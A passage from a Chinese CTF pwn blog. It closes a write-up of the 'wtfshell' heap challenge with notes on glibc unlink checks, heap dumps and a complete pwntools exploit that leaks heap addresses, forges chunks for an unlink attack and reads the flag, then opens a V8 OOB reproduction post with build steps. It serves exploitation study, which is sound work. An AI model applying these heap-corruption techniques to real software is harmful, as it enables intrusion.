<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">rip(<span class="string">&quot;3&quot;</span>,<span class="string">&quot;d&quot;</span>*<span class="number">0x100</span>)</span><br><span class="line">newfile(<span class="string">&quot;4&quot;</span>*<span class="number">0x3f8</span>,<span class="number">3</span>)</span><br><span class="line">newfile(<span class="string">&quot;5&quot;</span>*<span class="number">0x3f8</span>,<span class="number">3</span>)</span><br><span class="line">newfile(<span class="string">&quot;6&quot;</span>*<span class="number">0x3f8</span>,<span class="number">3</span>)</span><br><span class="line">newfile(<span class="string">&quot;7&quot;</span>*<span class="number">0x3f8</span>,<span class="number">3</span>)</span><br><span class="line">newfile(<span class="string">&quot;8&quot;</span>*<span class="number">0x3f8</span>,<span class="number">3</span>)</span><br><span class="line">newfile(<span class="string">&quot;9&quot;</span>*<span class="number">0x3f8</span>,<span class="number">3</span>)</span><br><span class="line">delfile(<span class="string">&quot;4&quot;</span>*<span class="number">0x3f8</span>)</span><br><span class="line">delfile(<span class="string">&quot;5&quot;</span>*<span class="number">0x3f8</span>)</span><br><span class="line">delfile(<span class="string">&quot;6&quot;</span>*<span class="number">0x3f8</span>)</span><br><span class="line">delfile(<span class="string">&quot;7&quot;</span>*<span class="number">0x3f8</span>)</span><br><span class="line">delfile(<span class="string">&quot;8&quot;</span>*<span class="number">0x3f8</span>)</span><br><span class="line">delfile(<span class="string">&quot;9&quot;</span>*<span class="number">0x3f8</span>)</span><br><span class="line"></span><br><span class="line">rip(<span class="string">&quot;2&quot;</span>,<span class="string">&quot;e&quot;</span>*<span class="number">0x100</span>)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">tcachebins</span></span><br><span class="line"><span class="string">0x410 [  7]: 0x55662d896d40 —▸ 0x55662d8998e0 —▸ 0x55662d8994d0 —▸ 0x55662d8990c0 —▸ 0x55662d898cb0 —▸ 0x55662d8988a0 —▸ 0x55662d897590 ◂— 0x0</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">reboot()</span><br><span class="line">payload = <span class="string">&quot;rip.&quot;</span>+<span class="string">&quot;a&quot;</span>*(<span class="number">0x400</span>-<span class="number">4</span>)</span><br><span class="line">cmd(payload)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Allocated chunk | PREV_INUSE /* target chunk */</span></span><br><span class="line"><span class="string">Addr: 0x55662d896d30 </span></span><br><span class="line"><span class="string">Size: 0x411</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Free chunk (unsortedbin) /* next chunk */</span></span><br><span class="line"><span class="string">Addr: 0x55662d897140 </span></span><br><span class="line"><span class="string">Size: 0x400</span></span><br><span class="line"><span class="string">fd: 0x55662d8968f0</span></span><br><span class="line"><span class="string">bk: 0x7f26dc2c0be0</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>当 <code>&quot;rip.&quot;+&quot;a&quot;*(0x400-4)</code> 执行时，会联通 next chunk-&gt;presize 一直定位到 next chunk-&gt;size 的低字节，然后把这个整体当做 <code>fname</code></li>
</ul>
<p>接下来的思路就很明确了，就是搭建堆风水实现堆重叠，然后利用重叠来修改 <code>file-&gt;fdata</code> 使其指向“flag1”</p>
<p>在搭建堆风水的过程中，有以下几点需要注意：</p>
<ul>
<li>由于程序的输入会被“\x00”截断，所以伪造 unlink attack 的时候需要从后往前写入数据</li>
<li>触发 unlink 时，除了常规检查以外，还会进行如下检查：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">     <span class="keyword">if</span> (p-&gt;fd_nextsize-&gt;bk_nextsize != p</span><br><span class="line">  || p-&gt;bk_nextsize-&gt;fd_nextsize != p)</span><br><span class="line">malloc_printerr (<span class="string">&quot;corrupted double-linked list (not small)&quot;</span>);</span><br></pre></td></tr></table></figure>
<ul>
<li>如果 <code>p-&gt;fd_nextsize</code> 写有数据，并且该 chunk 的大小大于 “0x400”，那么程序就会认为该 chunk 是 large chunk，并在 unlink 时触发这个检查（由于本程序的特殊写入机制，<code>p-&gt;fd_nextsize</code> 必须有数据）</li>
</ul>
<p>在调试堆风水的过程中，发现“0x421”大小的 Chunk 难以利用，于是改为了“0x321”（和上面的测试样例有差别），最后费了九牛二虎之力终于搞好了</p>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line"><span class="comment">#challenge = &#x27;./wtfshell_debug&#x27;</span></span><br><span class="line">challenge = <span class="string">&#x27;./wtfshell&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;172.51.221.20&#x27;</span>,<span class="string">&#x27;9999&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x269F)\n&quot;</span>)</span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    p.sendline(op)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">qq</span>():</span></span><br><span class="line">    cmd(<span class="string">&quot;qq&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lol</span>():</span></span><br><span class="line">    cmd(<span class="string">&quot;lol.-l&quot;</span>)</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rip</span>(<span class="params">filename,data</span>):</span></span><br><span class="line">    cmd(<span class="string">&quot;rip.&quot;</span>+filename) <span class="comment"># filename == NULL =&gt; stdout</span></span><br><span class="line">    p.sendline(data)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">newfile</span>(<span class="params">filename,flag</span>):</span></span><br><span class="line">    cmd(<span class="string">&quot;nsfw.&quot;</span>+filename+<span class="string">&quot;.&quot;</span>+<span class="built_in">str</span>(flag))</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">* --: 0 (non-readable &amp; non-writable)</span></span><br><span class="line"><span class="string">* -w: 1 (write only)</span></span><br><span class="line"><span class="string">* r-: 2 (read only)</span></span><br><span class="line"><span class="string">* rw: 3 (readable &amp; writable)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">writefile</span>(<span class="params">filename,data</span>):</span></span><br><span class="line">    cmd(<span class="string">&quot;wtf.&quot;</span>+data+<span class="string">&quot;.&quot;</span>+filename)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">showfile</span>(<span class="params">filename</span>):</span></span><br><span class="line">    cmd(<span class="string">&quot;omfg.&quot;</span>+filename)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delfile</span>(<span class="params">filename</span>):</span></span><br><span class="line">    cmd(<span class="string">&quot;gtfo.&quot;</span>+filename)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">deluser</span>():</span></span><br><span class="line">    cmd(<span class="string">&quot;ouo&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">newuser</span>(<span class="params">username</span>):</span></span><br><span class="line">    cmd(<span class="string">&quot;stfu.&quot;</span>+username)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">newpassword</span>(<span class="params">username,password</span>):</span></span><br><span class="line">    cmd(<span class="string">&quot;asap.&quot;</span>+username) <span class="comment"># NULL == root</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;password:&quot;</span>,password)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;retype password:&quot;</span>,password)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">changeuser</span>(<span class="params">username</span>):</span></span><br><span class="line">    cmd(<span class="string">&quot;sus.&quot;</span>+username) <span class="comment"># NULL == root</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shit</span>():</span></span><br><span class="line">    cmd(<span class="string">&quot;shit&quot;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reboot</span>():</span></span><br><span class="line">    cmd(<span class="string">&quot;irl&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leakheap</span>(<span class="params">username,password</span>):</span></span><br><span class="line">    heap_addr = <span class="string">&quot;\x80&quot;</span></span><br><span class="line">    try_addr = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xff</span>):</span><br><span class="line">                <span class="keyword">if</span>(j==<span class="number">0xa</span>):</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="comment">#success(&quot;heap_addr &gt;&gt; &quot; + hex(u64(heap_addr.ljust(0x8,&#x27;\0&#x27;))))</span></span><br><span class="line">                try_addr = heap_addr + <span class="built_in">chr</span>(j)</span><br><span class="line">                cmd(<span class="string">&quot;asap.&quot;</span>+username)</span><br><span class="line">                p.sendlineafter(<span class="string">&quot;password:&quot;</span>,password)</span><br><span class="line">                p.sendlineafter(<span class="string">&quot;retype password:&quot;</span>,password+try_addr)</span><br><span class="line">                ret = p.recvuntil(<span class="string">&quot;\n&quot;</span>,timeout=<span class="number">0.1</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">b&quot;asap: &quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> ret:</span><br><span class="line">                    heap_addr += <span class="built_in">chr</span>(j)</span><br><span class="line">                    p.sendline(<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">return</span> heap_addr</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_reverse</span>(<span class="params">filename,payload</span>):</span></span><br><span class="line">    whole_size = <span class="built_in">len</span>(payload)+<span class="number">1</span></span><br><span class="line">    no_null_payload = payload.replace(<span class="string">&#x27;\x00&#x27;</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(payload)-<span class="number">0x10</span>):</span><br><span class="line">        <span class="keyword">if</span> no_null_payload[whole_size-i-<span class="number">2</span>:whole_size-i-<span class="number">1</span>] == <span class="string">&#x27;a&#x27;</span>:</span><br><span class="line">            writefile(filename,no_null_payload[<span class="number">0</span>:whole_size-i-<span class="number">2</span>])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">newuser(<span class="string">&quot;yhellow&quot;</span>)</span><br><span class="line">newuser(<span class="string">&quot;yhellow2&quot;</span>)</span><br><span class="line"></span><br><span class="line">heap_addr = u64(leakheap(<span class="string">&quot;yhellow2&quot;</span>,<span class="string">&quot;b&quot;</span>*<span class="number">0x40</span>).ljust(<span class="number">0x8</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">heap_base = heap_addr - <span class="number">0x880</span></span><br><span class="line">success(<span class="string">&quot;heap_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">presize = <span class="number">0xd10</span></span><br><span class="line">payload = p16(presize) + <span class="string">&quot;/&quot;</span>*<span class="number">6</span></span><br><span class="line"></span><br><span class="line">newfile(<span class="string">&quot;1&quot;</span>,<span class="number">3</span>)</span><br><span class="line">writefile(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;b&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line">rip(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x100</span>)</span><br><span class="line">rip(<span class="string">&quot;1&quot;</span>,payload+<span class="string">&quot;b&quot;</span>*<span class="number">0xf8</span>)</span><br><span class="line">rip(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;c&quot;</span>*<span class="number">0x100</span>)</span><br><span class="line">rip(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;d&quot;</span>*<span class="number">0x100</span>)</span><br><span class="line">rip(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;e&quot;</span>*<span class="number">0x100</span>)</span><br><span class="line">rip(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;f&quot;</span>*<span class="number">0x100</span>)</span><br><span class="line">rip(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;g&quot;</span>*<span class="number">0x100</span>)</span><br><span class="line">rip(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;h&quot;</span>*<span class="number">0x100</span>)</span><br><span class="line">rip(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;i&quot;</span>*<span class="number">0x100</span>)</span><br><span class="line">rip(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;g&quot;</span>*<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">newfile(<span class="string">&quot;2&quot;</span>,<span class="number">3</span>)</span><br><span class="line">newfile(<span class="string">&quot;3&quot;</span>,<span class="number">3</span>)</span><br><span class="line">rip(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;b&quot;</span>*<span class="number">0x100</span>)</span><br><span class="line">writefile(<span class="string">&quot;2&quot;</span>,<span class="string">&quot;c&quot;</span>*(<span class="number">0x400</span>-<span class="number">6</span>))</span><br><span class="line">writefile(<span class="string">&quot;3&quot;</span>,<span class="string">&quot;d&quot;</span>*<span class="number">0x310</span>)</span><br><span class="line"></span><br><span class="line">newfile(<span class="string">&quot;4&quot;</span>*<span class="number">0x3f8</span>,<span class="number">3</span>)</span><br><span class="line">newfile(<span class="string">&quot;5&quot;</span>*<span class="number">0x3f8</span>,<span class="number">3</span>)</span><br><span class="line">newfile(<span class="string">&quot;6&quot;</span>*<span class="number">0x3f8</span>,<span class="number">3</span>)</span><br><span class="line">newfile(<span class="string">&quot;7&quot;</span>*<span class="number">0x3f8</span>,<span class="number">3</span>)</span><br><span class="line">newfile(<span class="string">&quot;8&quot;</span>*<span class="number">0x3f8</span>,<span class="number">3</span>)</span><br><span class="line">newfile(<span class="string">&quot;9&quot;</span>*<span class="number">0x3f8</span>,<span class="number">3</span>)</span><br><span class="line">delfile(<span class="string">&quot;4&quot;</span>*<span class="number">0x3f8</span>)</span><br><span class="line">delfile(<span class="string">&quot;5&quot;</span>*<span class="number">0x3f8</span>)</span><br><span class="line">delfile(<span class="string">&quot;6&quot;</span>*<span class="number">0x3f8</span>)</span><br><span class="line">delfile(<span class="string">&quot;7&quot;</span>*<span class="number">0x3f8</span>)</span><br><span class="line">delfile(<span class="string">&quot;8&quot;</span>*<span class="number">0x3f8</span>)</span><br><span class="line">delfile(<span class="string">&quot;9&quot;</span>*<span class="number">0x3f8</span>)</span><br><span class="line"></span><br><span class="line">fakechunk_addr = heap_base + <span class="number">0x3f0</span></span><br><span class="line">rip(<span class="string">&quot;2&quot;</span>,<span class="string">&quot;e&quot;</span>*<span class="number">0x100</span>)</span><br><span class="line">reboot()</span><br><span class="line"></span><br><span class="line">newfile(<span class="string">&quot;1&quot;</span>,<span class="number">3</span>)</span><br><span class="line">writefile(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;f&quot;</span>*<span class="number">0x310</span>)</span><br><span class="line">rip(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;e&quot;</span>*<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">newfile(<span class="string">&quot;4&quot;</span>,<span class="number">3</span>)</span><br><span class="line">payload = <span class="string">&quot;p&quot;</span>*<span class="number">0x60</span> </span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(presize+<span class="number">1</span>) </span><br><span class="line">payload += p64(fakechunk_addr+<span class="number">0x18</span>) + p64(fakechunk_addr+<span class="number">0x20</span>) </span><br><span class="line">payload += p64(fakechunk_addr+<span class="number">0x10</span>) + p64(fakechunk_addr+<span class="number">0x18</span>)</span><br><span class="line">payload += p64(fakechunk_addr) + p64(fakechunk_addr)</span><br><span class="line">write_reverse(<span class="string">&quot;4&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">newfile(<span class="string">&quot;2&quot;</span>,<span class="number">3</span>)</span><br><span class="line">writefile(<span class="string">&quot;2&quot;</span>,<span class="string">&quot;k&quot;</span>*<span class="number">0x310</span>)</span><br><span class="line">payload = <span class="string">&quot;rip.&quot;</span>+<span class="string">&quot;a&quot;</span>*(<span class="number">0x400</span>-<span class="number">4</span>)</span><br><span class="line">cmd(payload)</span><br><span class="line"></span><br><span class="line">newfile(<span class="string">&quot;3&quot;</span>*<span class="number">0x2f0</span>,<span class="number">3</span>)</span><br><span class="line">newfile(<span class="string">&quot;4&quot;</span>*<span class="number">0x2f0</span>,<span class="number">3</span>)</span><br><span class="line">newfile(<span class="string">&quot;5&quot;</span>*<span class="number">0x2f0</span>,<span class="number">3</span>)</span><br><span class="line">newfile(<span class="string">&quot;6&quot;</span>*<span class="number">0x2f0</span>,<span class="number">3</span>)</span><br><span class="line">newfile(<span class="string">&quot;7&quot;</span>*<span class="number">0x2f0</span>,<span class="number">3</span>)</span><br><span class="line">newfile(<span class="string">&quot;8&quot;</span>*<span class="number">0x2f0</span>,<span class="number">3</span>)</span><br><span class="line">newfile(<span class="string">&quot;9&quot;</span>*<span class="number">0x2f0</span>,<span class="number">3</span>)</span><br><span class="line">delfile(<span class="string">&quot;3&quot;</span>*<span class="number">0x2f0</span>)</span><br><span class="line">delfile(<span class="string">&quot;4&quot;</span>*<span class="number">0x2f0</span>)</span><br><span class="line">delfile(<span class="string">&quot;5&quot;</span>*<span class="number">0x2f0</span>)</span><br><span class="line">delfile(<span class="string">&quot;6&quot;</span>*<span class="number">0x2f0</span>)</span><br><span class="line">delfile(<span class="string">&quot;7&quot;</span>*<span class="number">0x2f0</span>)</span><br><span class="line">delfile(<span class="string">&quot;8&quot;</span>*<span class="number">0x2f0</span>)</span><br><span class="line">delfile(<span class="string">&quot;9&quot;</span>*<span class="number">0x2f0</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">0x2f0</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x41</span>)</span><br><span class="line">write_reverse(<span class="string">&quot;2&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">delfile(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">newfile(<span class="string">&quot;5&quot;</span>*<span class="number">0x30</span>,<span class="number">3</span>)</span><br><span class="line">newfile(<span class="string">&quot;6&quot;</span>*<span class="number">0x30</span>,<span class="number">3</span>)</span><br><span class="line">delfile(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">newfile(<span class="string">&quot;7&quot;</span>*<span class="number">0x30</span>,<span class="number">3</span>)</span><br><span class="line">writefile(<span class="string">&quot;5&quot;</span>*<span class="number">0x30</span>,<span class="string">&quot;5&quot;</span>*<span class="number">0x360</span>)</span><br><span class="line"></span><br><span class="line">flag_addr = heap_base + <span class="number">0x360</span></span><br><span class="line">name_addr = heap_base + <span class="number">0x26c0</span></span><br><span class="line">payload = <span class="string">&quot;x&quot;</span>*<span class="number">0x338</span></span><br><span class="line">payload += p64(<span class="number">0x31</span>)+p64(name_addr)+ p64(flag_addr)</span><br><span class="line"></span><br><span class="line">write_reverse(<span class="string">&quot;7&quot;</span>*<span class="number">0x30</span>,payload)</span><br><span class="line">showfile(<span class="string">&quot;6&quot;</span>*<span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>小结：</strong></p>
<p>堆风水搭得我吐血，不过还是学到了新的利用姿势</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/12/06/V8+JavaScript%20pwn+%E7%B1%BB%E5%9E%8B%E6%B7%B7%E6%B7%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/12/06/V8+JavaScript%20pwn+%E7%B1%BB%E5%9E%8B%E6%B7%B7%E6%B7%86/" class="post-title-link" itemprop="url">V8+JavaScript pwn+类型混淆</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-12-06 02:12:47 / Modified: 02:14:22" itemprop="dateCreated datePublished" datetime="2022-12-06T02:12:47+08:00">2022-12-06</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Reappearance/" itemprop="url" rel="index"><span itemprop="name">Reappearance</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>27k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>25 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>OOB 复现</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git checkout 6dc88c191f5ecc5389dc26efa3ca0907faef3598 -f</span><br><span class="line">gclient sync</span><br><span class="line">git apply ./pwn_patch/oob.diff</span><br><span class="line">./tools/dev/v8gen.py x64.release</span><br><span class="line">ninja -C ./out.gn/x64.release d8</span><br></pre></td></tr></table></figure>
<p>在编译前，需要先在 <code>out.gn/x64.debug/args.gn</code> 中加入以下代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">v8_enable_backtrace = <span class="literal">true</span></span><br><span class="line">v8_enable_disassembler = <span class="literal">true</span></span><br><span class="line">v8_enable_object_print = <span class="literal">true</span></span><br><span class="line">v8_enable_verify_heap = <span class="literal">true</span></span><br></pre></td></tr></table></figure>
